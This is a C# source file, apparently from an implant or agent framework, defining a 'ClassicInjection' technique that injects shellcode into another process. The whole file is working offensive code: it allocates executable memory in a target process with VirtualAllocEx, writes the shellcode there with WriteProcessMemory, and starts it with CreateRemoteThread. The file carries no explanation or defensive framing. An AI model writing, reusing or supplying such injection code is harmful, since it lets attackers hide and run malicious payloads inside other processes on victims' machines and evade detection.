using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent
{
    internal class ClassicInjection : ITechnique
    {
        public bool Inject(byte[] shellcode, IntPtr hTarget)
        {
            return this.Run(hTarget, shellcode);
        }

        public bool Inject(byte[] shellcode, Process proc)
        {
            return this.Run(proc.Handle, shellcode);
        }

        private bool Run(IntPtr target, byte[] shellcode)
        {
            // allocate some memory for our shellcode
            IntPtr pAddr = Native.VirtualAllocEx(target, IntPtr.Zero, (UInt32)shellcode.Length, Native.AllocationType.Commit | Native.AllocationType.Reserve, Native.MemoryProtection.PAGE_EXECUTE_READWRITE);
            if (pAddr == IntPtr.Zero)
            {
                return false;
            }

            // write the shellcode into the allocated memory
            if (!Native.WriteProcessMemory(target, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten))
            {
                return false;
            };

            // create the remote thread
            IntPtr hThread = Native.CreateRemoteThread(target, IntPtr.Zero, 0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, out hThread);

            if (hThread == IntPtr.Zero)
            {
                return false;
            }
            return true;
        }
    }
}
